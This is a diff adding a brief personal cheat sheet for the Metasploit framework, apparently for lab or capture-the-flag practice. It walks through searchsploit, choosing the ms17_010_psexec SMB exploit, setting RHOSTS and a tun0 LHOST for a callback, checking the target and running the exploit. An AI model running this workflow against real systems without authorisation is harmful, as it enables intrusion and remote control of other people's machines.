@@ -1,0 +1,31 @@
+metasploit 
+
+/////////////////////////////////////////////////////////////////////
+
+Frist time, you need search keyword 
+  searchsploit openssh 7.2
+
+Open metasploit 
+  msfconsole
+
+Search modules exploit 
+  search exploit CVE-XXXX-XXXX
+
+Use module 
+  use 0     // can be use ordinal or module name
+  use exploit/windows/smb/ms17_010_psexec
+
+What option we need ? 
+  show options
+
+How to setup ? when you know options you need config 
+  set RHOSTS 10.10.10.40
+  set LHOST tun0
+
+We done ? yes. In the final step, you need to exploit
+But you need to check that to ensure sever is vulnerable 
+  check
+
+Ok final 
+  exploit 
+
